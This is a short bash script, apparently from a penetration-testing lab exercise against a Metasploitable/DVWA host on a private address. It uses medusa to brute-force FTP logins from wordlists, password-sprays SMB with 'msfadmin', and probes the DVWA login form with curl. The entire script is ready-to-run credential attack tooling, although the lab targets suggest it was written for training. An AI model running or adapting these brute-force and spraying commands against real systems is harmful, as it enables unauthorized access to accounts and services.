#!/usr/bin/env bash
set -euo pipefail

TARGET_IP="${1:-192.168.56.103}"
SPRAY_PASS="${2:-msfadmin}"
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
USERS_FILE="${BASE_DIR}/wordlists/users.txt"
PASS_FILE="${BASE_DIR}/wordlists/passwords.txt"

echo "[1/3] Força bruta em FTP (porta 21) contra ${TARGET_IP}..."
medusa -h "${TARGET_IP}" -U "${USERS_FILE}" -P "${PASS_FILE}" -M ftp -f || true

echo ""
echo "[2/3] Password spraying em SMB (porta 445) contra ${TARGET_IP}..."
medusa -h "${TARGET_IP}" -U "${USERS_FILE}" -p "${SPRAY_PASS}" -M smbnt -f || true

echo ""
echo "[3/3] Inspeção do formulário web / DVWA (porta 80) em ${TARGET_IP}..."
curl -s -L "http://${TARGET_IP}/dvwa/login.php" | grep -iE "<form|<input|action=" || true
medusa -M http -q || true
